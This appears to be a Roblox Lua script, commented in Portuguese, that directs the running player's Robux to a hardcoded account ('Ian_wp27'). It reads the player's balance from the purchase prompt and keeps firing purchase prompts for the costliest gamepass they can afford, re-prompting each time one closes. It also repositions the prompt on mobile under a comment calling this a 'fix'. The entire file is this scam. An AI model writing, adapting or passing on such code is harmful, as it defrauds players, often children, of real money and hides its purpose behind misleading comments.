local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- Nome do jogador que vai receber
local Username = "Ian_wp27"

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

if not success or not UserId then
    warn("Usuário não encontrado!")
    return
end

local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    Players.LocalPlayer:Kick("Receiver not found!")
    return
end

local asset
local userRobux = 0

-- Função de compra: escolhe o item mais caro que você consegue comprar
local function Purchase()
    local bestPrice = 0
    asset = nil

    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        local assetType = v:GetAttribute("AssetType")
        local owns = MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId"))
        local price = tonumber(v:GetAttribute("AssetPrice"))

        if assetType == "Gamepass" and not owns and price and price <= userRobux then
            if price > bestPrice then
                asset = v
                bestPrice = price
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, bestPrice)
    end
end

-- Espera o PurchasePromptApp aparecer
local PurchasePromptApp
repeat
    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
    task.wait(0.1)
until PurchasePromptApp

-- Ajusta a posição do prompt para mobile
local function FixMobilePrompt()
    local animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            -- Lê saldo do texto do prompt
            local balanceLabel = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
            if balanceLabel then
                userRobux = tonumber(balanceLabel.Text:match("%d+")) or 0
            end

            -- Move botão para esquerda se for mobile
            if UserInputService.TouchEnabled then
                child.Position = UDim2.new(0, 50, 0.5, -child.Size.Y.Offset/2)
            else
                child.Position = UDim2.new(0.5, -child.Size.X.Offset/2, 0.5, -child.Size.Y.Offset/2)
            end
        end
    end)
end

FixMobilePrompt()

-- Monitora o fechamento do prompt para comprar novamente
local function MonitorPurchases()
    local animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            Purchase()
        end
    end)
end

MonitorPurchases()

-- Faz a primeira compra
Purchase()
